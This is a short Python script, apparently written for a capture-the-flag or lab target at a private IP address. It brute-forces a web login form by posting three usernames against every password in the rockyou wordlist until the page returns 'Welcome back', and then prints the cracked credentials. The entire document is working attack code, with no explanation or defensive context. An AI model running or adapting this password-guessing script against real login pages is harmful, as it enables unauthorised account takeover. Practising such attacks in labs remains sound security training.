import requests
import sys

target = "http://10.129.107.227:80"
usernames = ["admin", "username", "test"]
passwords = "/usr/share/wordlists/rockyou.txt"

#string to identify successful login
needle = "Welcome back"

for username in usernames:
    with open(passwords, 'r') as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:pass -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username":username, "password":password})
            if needle.encode() in r.content:
                sys.stdout.write("\n\t[>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\nNo valid password found for '{}'".format(username))
        sys.stdout.write("\n")